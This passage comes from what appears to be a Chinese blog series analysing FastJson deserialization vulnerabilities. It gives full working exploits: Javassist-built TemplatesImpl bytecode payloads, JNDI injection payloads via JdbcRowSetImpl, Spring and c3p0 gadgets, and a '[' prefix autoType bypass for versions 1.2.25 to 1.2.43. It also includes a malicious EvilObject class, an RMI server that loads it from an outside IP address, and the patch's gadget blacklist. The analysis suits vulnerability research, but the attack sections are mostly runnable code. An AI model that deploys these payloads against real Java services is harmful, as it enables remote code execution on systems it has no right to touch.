class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line">        </span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        </span><br><span class="line">        Object res = JSON.parseObject(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后的结果如下所示:</p>
<p><img src="4.png" alt=""></p>
<h2 id="漏洞利用细节"><a href="#漏洞利用细节" class="headerlink" title="漏洞利用细节"></a>漏洞利用细节</h2><h3 id="01-outputProperties如何与getOutputProperties-关联起来？"><a href="#01-outputProperties如何与getOutputProperties-关联起来？" class="headerlink" title="01._outputProperties如何与getOutputProperties()关联起来？"></a>01._outputProperties如何与getOutputProperties()关联起来？</h3><p>可以看到_outputProperties成员变量和getter方法getOutputProperties()之间相差了一个<font color=#008000><code>_</code></font>字符。是如何关联起来的呢？</p>
<p>这是由JavaBeanInfo.build进行处理的，FastJson会创建一个fieldList数组，用于保存目标Java类的成员变量以及相应的setter或getter方法，以供反序列化字段时调用。</p>
<p>FastJson会对setter、getter、成员变量分别进行处理，智能提取出成员变量信息。逻辑如下:</p>
<ol>
<li>识别setter方法名，并根据setter方法名提取出成员变量名。</li>
<li>通过clazz.getFields()获取成员变量。</li>
<li>识别getter方法名，并根据getter方法名提取出成员变量名。</li>
</ol>
<p>定位到JavaBeanInfo.build()函数中，来看一下，它是如何从getter方法中提取出成员变量的。可以看到，它是将第4个字符变成小写，然后拼接上后面的字符。</p>
<p><img src="6.png" alt=""></p>
<p>此时在fieldList中存入的是outputProperties与getOutputProperties之间的对应关系。还是没有对应上_outputProperties。继续看，接下来FastJson会语义分析JSON字符串。定位到JavaBeanDeserializer.parseField()函数</p>
<p><img src="7.png" alt=""></p>
<p>这里的key为_outputProperties。这里跟进一下smartMatch(key)。</p>
<p><img src="8.png" alt=""></p>
<p>这里会将_outputProperties这个成员变量与outputProperties相关联，从而也就与getOutputProperties()相关联了。</p>
<h3 id="02-为什么要对-bytecodes进行Base64编码"><a href="#02-为什么要对-bytecodes进行Base64编码" class="headerlink" title="02.为什么要对_bytecodes进行Base64编码?"></a>02.为什么要对_bytecodes进行Base64编码?</h3><p>在以往的情况下，并不需要对_bytecodes进行Base64编码。而我在newTransformer()函数中发现_bytecodes确实是Base64解码后字节码。那么是在什么地方进行了解码呢？</p>
<p>定位到ObjectArrayCodec.deserialze()</p>
<p><img src="9.png" alt=""></p>
<p>然后跟进byteValue()</p>
<p><img src="10.png" alt=""></p>
<p>在这里进行了base64解码。</p>
<h1 id="利用链分析之JNDI注入"><a href="#利用链分析之JNDI注入" class="headerlink" title="利用链分析之JNDI注入"></a>利用链分析之JNDI注入</h1><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>由于此利用方式需要用到JNDI注入，对此不了解的可以先了解一下。此次利用JNDI注入需要满足2个条件:</p>
<ol>
<li>存在有漏洞的代码(即lookup(uri)，且uri可控)</li>
<li>Java版本(&lt;=jdk1.8_113) (RMI利用方式)</li>
</ol>
<p>有趣的是，第一点条件可利用<code>com.sun.rowset.JdbcRowSetImpl</code>类完成。定位到JdbcRowSetImpl类，搜索lookup函数，直接定位到<code>connect()</code>函数。</p>
<p><img src="3-1.png" alt=""></p>
<p>可以看到是很完美的漏洞触发代码，那么需要知道<code>this.getDataSourceName()</code>是否可控。跟进它。它取自<code>BaseRowSet</code>类的getDataSourceName()函数，且dataSource是个私有变量，可以通过其setter函数进行赋值。</p>
<p><img src="4-1.png" alt=""><br><img src="5-1.png" alt=""><br><img src="6-1.png" alt=""></p>
<p>而JdbcRowSetImpl类继承自BaseRowSet类，且重写了setDataSourceName()函数，定位到这个函数。</p>
<p><img src="7-1.png" alt=""></p>
<p>它会调用其父类即BaseRowSet类的setDataSourceName()函数，从而给dataSource赋值。</p>
<p>到这里为止，uri也可控了。但由于上述的connect()是protected类型的，不能直接被访问。所以找到了该类的setAutoCommit()函数。如下所示:</p>
<p><img src="8-1.png" alt=""></p>
<p>到这里，JdbcRowSetImpl类提供了一个可以进行JNDI注入的入口点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);</span><br><span class="line">        jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EXP构造-1"><a href="#EXP构造-1" class="headerlink" title="EXP构造"></a>EXP构造</h3><p>因此，在进行fastjson反序列化时，需要调用该类的setDataSourceName函数和setAutoCommit函数。那么构造payload传入了<code>dataSourceName</code>变量和<code>autoCommit</code>值。</p>
<p>而实际上，在JdbcRowSetImpl类中并没有这两个成员变量，但传入的payload中若有这2个变量，便可调用对应的setter方法。非常神奇的一点认识。不过联想到fastjson反序列化时获取成员变量的一套逻辑，便可以想通了。</p>
<p>因此payload为:</p>
<font color=#008000>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">	&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;&quot;,</span><br><span class="line">	&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</font>

<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先在web服务器上放入恶意的class文件。在所在目录下利用php内置服务器起一下(<code>php -S 0.0.0.0:2333</code>)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"open /Applications/Calculator.app"</span>&#125;;</span><br><span class="line">        rt.exec(commands);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>然后起一个rmi服务。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server_rmi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        String FactoryURL = <span class="string">"http://101.200.144.143:2333/"</span>;</span><br><span class="line">        Reference evilObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>,<span class="string">"EvilObject"</span>,FactoryURL);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(evilObj);</span><br><span class="line">        registry.bind(<span class="string">"EvilObject"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的客户端demo如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.22-1.2.24&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在JDK1.8_111环境下，运行的结果如下图所示:</p>
<p><img src="9-1.png" alt=""></p>
<h2 id="PropertyPathFactoryBean"><a href="#PropertyPathFactoryBean" class="headerlink" title="PropertyPathFactoryBean"></a>PropertyPathFactoryBean</h2><p>利用此类在fastjson反序列化过程中进行JNDI注入需要依赖于以下的第三方包</p>
<ul>
<li>spring-beans</li>
<li>spring-context</li>
<li>spring-core</li>
</ul>
<p>在正式开始分析之前，首先介绍一个在spring-context中类<code>org.springframework.jndi.JndiTemplate</code>。它是spring里面用来简化对JNDI的操作的类，提供了lookup、bind方法。来看看它的lookup方法。</p>
<p><img src="1-2.png" alt=""></p>
<p>可以看到正好满足了jndi注入的条件，现在需要考虑的是如何调用到此函数，且参数name可控。接着定位到<code>org.springframework.jndi.JndiLocatorSupport</code>类的lookup函数。</p>
<p><img src="2-2.png" alt=""></p>
<p>该类继承了JndiAccessor类，JndiAccessor类中的getJndiTemplates()函数返回的就是一个JndiTemplate对象。那么接着要找一个调用了JndiLocatorSupport类的lookup函数的类或者直接调用了JndiTemplate类的lookup函数的类。定位到<code>org.springframework.jndi.support.SimpleJndiBeanFactory</code>类。</p>
<p><img src="3-2.png" alt=""></p>
<p>该类继承自JndiLocatorSupport类，且在多个函数中调用了lookup函数。例如，<code>getBean()</code>、<code>doGetType</code>、<code>doGetSingleton</code>。虽然这里有getBean()函数，但由于它存在入口参数，所以不能在反序列化时被自动调用。那么就继续往下看，看看调用了这三个函数之一的其他函数。定位到<code>org.springframework.beans.factory.config.PropertyPathFactoryBean</code>类的<code>setBeanFactory()</code>。</p>
<p><img src="4-2.png" alt=""></p>
<p>可以看到在该函数中调用了this.beanFactory.getBean()函数，SimpleJndiBeanFactory实现了BeanFactory类，且setBeanFactory()函数满足fastjson反序列化时自动调用的条件。到此整个分析结束。</p>
<h3 id="EXP构造-2"><a href="#EXP构造-2" class="headerlink" title="EXP构造"></a>EXP构造</h3><p>上面分析了整个过程。首先待反序列化的类是<code>PropertyPathFactoryBean</code>，根据条件。</p>
<ul>
<li>1）需要给成员变量beanFactory赋值且赋值为<code>SimpleJndiBeanFactory</code>类的对象。</li>
<li>2 需要给targetBeanName赋值为jndi的url。</li>
</ul>
<p>因此，payload形式为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看setBeanFactory()函数中要走到getBean()的条件。</p>
<p><img src="5-2.png" alt=""></p>
<p>很显然，这里的targetBeanName不为null，会走到下面的判断。当propertyPath不为null的情况下，才会继续往下走。</p>
<p>因此payload增加为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;propertyPath&quot;:&quot;foo&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就调用this.beanFactory.getBean()方法。    其实在这里不是很能理解，为什么需要加上”shareableResources”的值为[“rmi://127.0.0.1:1099/EvilObject”]。这是必须条件，如果不填写这个值，反序列化beanFactory的时候就会失败，走不到this.beanFactory.getBean()。</p>
<p>之后的完整的payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">	&quot;targetBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">	&quot;propertyPath&quot;:&quot;foo&quot;,</span><br><span class="line">	&quot;beanFactory&quot;: &#123;</span><br><span class="line">						 &quot;@type&quot;:&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><br><span class="line">						 &quot;shareableResources&quot;:[&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;]</span><br><span class="line">					&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>完整的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.24 ,spring-beans,spring-context,spring-core&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">propertypathFactorybbean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"rand1\": &#123;\"@type\": \"org.springframework.beans.factory.config.PropertyPathFactoryBean\",\"targetBeanName\": \"rmi://127.0.0.1:1099/EvilObject\",\"propertyPath\": \"foo\",\"beanFactory\": &#123;\"@type\": \"org.springframework.jndi.support.SimpleJndiBeanFactory\",\"shareableResources\": [\"rmi://127.0.0.1:1099/EvilObject\"]&#125;&#125;&#125;"</span>;</span><br><span class="line">        Object res = JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此外还有以下payload可以尝试。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: Set[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class="line">    &quot;beanFactory&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">      &quot;shareableResources&quot;: [</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;adviceBeanName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1:10099&#x2F;EvilObject&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class="line">    &quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class="line">    &quot;jndiName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">    &quot;loginTimeout&quot;: 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>通过查看补丁发现，原来根据”@type”的值直接加载类的操作修改为checkAutoType函数了。</p>
<p><img src="11.png" alt=""></p>
<p>且默认情况下autoType关闭了，可以看到它会经过一个黑名单判断，从而抛出异常。</p>
<p><img src="12.png" alt=""></p>
<p>其中黑名单中包括了以下大类:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bsh,</span><br><span class="line">com.mchange,</span><br><span class="line">com.sun.,</span><br><span class="line">java.lang.Thread,</span><br><span class="line">java.net.Socket,</span><br><span class="line">java.rmi,</span><br><span class="line">javax.xml,</span><br><span class="line">org.apache.bcel,</span><br><span class="line">org.apache.commons.beanutils,</span><br><span class="line">org.apache.commons.collections.Transformer,</span><br><span class="line">org.apache.commons.collections.functors,</span><br><span class="line">org.apache.commons.collections4.comparators,</span><br><span class="line">org.apache.commons.fileupload,</span><br><span class="line">org.apache.myfaces.context.servlet,</span><br><span class="line">org.apache.tomcat,</span><br><span class="line">org.apache.wicket.util,</span><br><span class="line">org.codehaus.groovy.runtime,</span><br><span class="line">org.hibernate,</span><br><span class="line">org.jboss,</span><br><span class="line">org.mozilla.javascript,</span><br><span class="line">org.python.core,</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>




<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">FastJson反序列化的前世今生</a></li>
<li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">fastjson 远程反序列化poc的构造和分析</a></li>
<li><a href="https://kingx.me/Details-in-FastJson-RCE.html" target="_blank" rel="noopener">FastJson反序列化漏洞利用的三个细节 - TemplatesImpl的利用链</a></li>
<li><a href="https://www.dazhuanlan.com/2020/02/10/5e40c9b6f1d85/" target="_blank" rel="noopener">FastJson反序列化漏洞分析</a></li>
<li><a href="https://manning23.github.io/2018/03/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jndi%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">FASTJSON反序列化之基于JNDI利用方式</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(四)</title>
    <url>/2020/05/16/fastjson-4/</url>
    <content><![CDATA[<p>上一个回顾中打补丁的方式是若存在一个<code>L</code>与<code>;</code>就去掉，若存在两个，则抛出异常。看起来已经无法通过添加<code>L</code>与<code>;</code>的方式来进行。之前在回顾系列(二)中提到过，除了添加<code>L;</code>之后，还可以添加<code>[</code>，不过在当时并没成功。事实上，它是可以成功的。这篇文件就介绍了这一方式。</p>
<a id="more"></a>
<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>1.2.25 &lt;= fastjson &lt;= 1.2.43</li>
</ul>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>打开autotype</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由于打补丁的方式非常简单粗暴，若className开头是<code>LL</code>就会抛出错误，所以无法利用<code>LL</code>这个点了。如下所示:</p>
<p><img src="1.png" alt=""></p>
<p>考虑利用另一个点<code>[</code>。定位到loadClass()函数。</p>
<p><img src="2.png" alt=""></p>
<p>之前分析得很浅，因为length为0，会抛出异常。我们直接加<code>[</code>是不可以的，那么应该如何构造使之能够可以呢？</p>
<p>根据FastJson反序列化的流程，由于@type是一个<code>[</code>，因此会调用到<code>com.alibaba.fastjson.serializer.ObjectArrayCodeC.class</code>中的deserialze()函数，跟进去，然后定位到如下图所示的位置:</p>
<p><img src="3.png" alt=""></p>
<p>首先通过clazz.getComponentType()获取到componentType，然后进入parser.parseArry()函数，跟进它。</p>
<p><img src="4.png" alt=""></p>
<p>可以看到此时的token值若不为14，即当前不为<code>[</code>，就会抛出异常，因此在””值后面紧跟着<code>[</code>。然后会进入lexer.nextToken()，跟进它。</p>
<p><img src="5.png" alt=""></p>
<p>如果当前的ch为</p>
<ul>
<li><code>{</code>，即在<code>[</code>之后的为<code>{</code>，则将token赋值为12，且移到下一个字符<code>&quot;</code></li>
<li><code>[</code>，即在<code>[</code>之后的为<code>[</code>，则将token赋值为14，且移到下一个字符<code>&quot;</code></li>
</ul>
<blockquote>
<p>事实上，这里只能写<code>{</code>，因为若token为14，在接下来的过程中会报错，我们后续会讲到这一点。</p>
</blockquote>
<p>在经历完这个之后，最终会走到((ObjectDeserializer)deserializer).deserialze()函数，如下图所示:</p>
<p><img src="6.png" alt=""></p>
<p>跟进它，它又会将后续的值进行反序列化。如下所示:</p>
<p><img src="7.png" alt=""></p>
<p>最终会调用到给autoCommit赋值的setAutoCommit函数，从而RCE。</p>
<p>那么再考虑一下上述第二种方式为什么不可以。同样跟进到deserialze函数里，如下图所示:</p>
<p><img src="8.png" alt=""></p>
<p>它最终抛出异常，从而无法RCE。</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>根据上述分析，EXP如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;</span><br><span class="line">					&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">					&quot;autoCommit&quot;:true</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>

<p>完整的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.25-1.2.43&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>完整的demo</p>
